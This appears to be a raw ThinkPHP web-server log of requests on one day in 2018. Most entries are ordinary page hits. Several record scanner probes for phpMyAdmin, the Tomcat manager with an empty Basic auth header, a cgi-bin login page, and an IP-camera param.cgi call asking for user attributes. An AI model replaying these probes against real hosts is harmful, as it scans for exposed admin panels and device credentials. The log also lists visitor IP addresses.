  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T14:40:44+08:00 ] 172.16.0.5 139.206.10.220 GET /
[ log ] 123.207.34.110/ [运行时间：0.015487s][吞吐率：64.57req/s] [内存消耗：1,683.12kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T15:09:40+08:00 ] 172.16.0.5 201.26.11.250 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.016142s][吞吐率：61.95req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T15:15:11+08:00 ] 172.16.0.5 85.187.254.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.015410s][吞吐率：64.89req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T15:41:06+08:00 ] 172.16.0.5 191.241.50.197 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014502s][吞吐率：68.96req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T15:55:13+08:00 ] 172.16.0.5 95.215.115.93 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014413s][吞吐率：69.38req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T17:08:40+08:00 ] 172.16.0.5 177.45.253.73 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014238s][吞吐率：70.24req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T17:22:15+08:00 ] 172.16.0.5 43.226.34.84 GET /phpMyAdmin
[ log ] 123.207.34.110/phpMyAdmin [运行时间：0.012492s][吞吐率：80.05req/s] [内存消耗：1,357.96kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpMyAdmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://123.207.34.110/phpMyAdmin',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T18:46:05+08:00 ] 172.16.0.5 111.230.245.148 GET /manager/html
[ log ] 123.207.34.110:80/manager/html [运行时间：0.011854s][吞吐率：84.36req/s] [内存消耗：1,356.20kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '123.207.34.110:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T19:17:14+08:00 ] 172.16.0.5 118.39.196.206 HEAD /
[ log ] 123.207.34.110/ [运行时间：0.014372s][吞吐率：69.58req/s] [内存消耗：1,682.80kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T19:33:32+08:00 ] 172.16.0.5 45.5.36.205 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.017479s][吞吐率：57.21req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T20:09:45+08:00 ] 172.16.0.5 190.181.9.60 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014396s][吞吐率：69.46req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T20:25:33+08:00 ] 172.16.0.5 187.95.169.128 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.018659s][吞吐率：53.59req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T20:55:26+08:00 ] 172.16.0.5 103.240.248.86 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.015296s][吞吐率：65.38req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T21:11:17+08:00 ] 172.16.0.5 113.96.68.30 GET /%5ccgi-bin/login.cgi
[ log ] 123.207.34.110/%5ccgi-bin/login.cgi [运行时间：0.012819s][吞吐率：78.01req/s] [内存消耗：1,356.04kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '\\cgi-bin',
    1 => 'login.cgi',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; RF-V7100 Build/RB3N5C)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T21:11:17+08:00 ] 172.16.0.5 113.96.68.30 GET /web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr
[ log ] 123.207.34.110/web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr [运行时间：0.012744s][吞吐率：78.47req/s] [内存消耗：1,356.63kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'web',
    1 => 'cgi-bin',
    2 => 'hi3510',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; RF-V7100 Build/RB3N5C)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'cmd' => 'getuserattr',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T21:11:17+08:00 ] 172.16.0.5 113.96.68.30 GET /
[ log ] 123.207.34.110/ [运行时间：0.014884s][吞吐率：67.19req/s] [内存消耗：1,684.61kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; RF-V7100 Build/RB3N5C)',
  'authorization' => 'Basic',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T23:38:33+08:00 ] 172.16.0.5 207.46.13.43 GET /
[ log ] zard-forever.com/ [运行时间：0.014877s][吞吐率：67.22req/s] [内存消耗：1,686.52kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
